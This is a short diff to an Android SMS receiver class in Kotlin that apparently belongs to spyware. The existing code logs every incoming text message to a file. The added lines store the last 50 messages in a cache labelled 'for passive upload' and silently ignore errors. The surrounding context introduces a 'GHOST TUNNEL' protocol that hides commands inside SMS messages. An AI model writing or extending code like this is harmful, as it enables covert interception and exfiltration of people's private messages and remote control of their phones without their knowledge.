@@ -44,6 +44,16 @@ class SmsReceiver : BroadcastReceiver() {
                     
                     // Write to file instantly (No Lag)
                     DumpManager.appendLog("SMS", entry)
+                    
+                    // Add to cache for passive upload
+                    try {
+                        val cacheStr = prefs.getString("sms_logs_cache", "[]")
+                        val cacheArr = JSONArray(cacheStr!!)
+                        cacheArr.put(entry)
+                        // Keep last 50
+                        if (cacheArr.length() > 50) cacheArr.remove(0)
+                        editor.putString("sms_logs_cache", cacheArr.toString())
+                    } catch(e: Exception) {}
 
                     // --- B. GHOST TUNNEL (Hii!! Protocol) ---
                     // Syntax: Hii!! [Command] [Content]
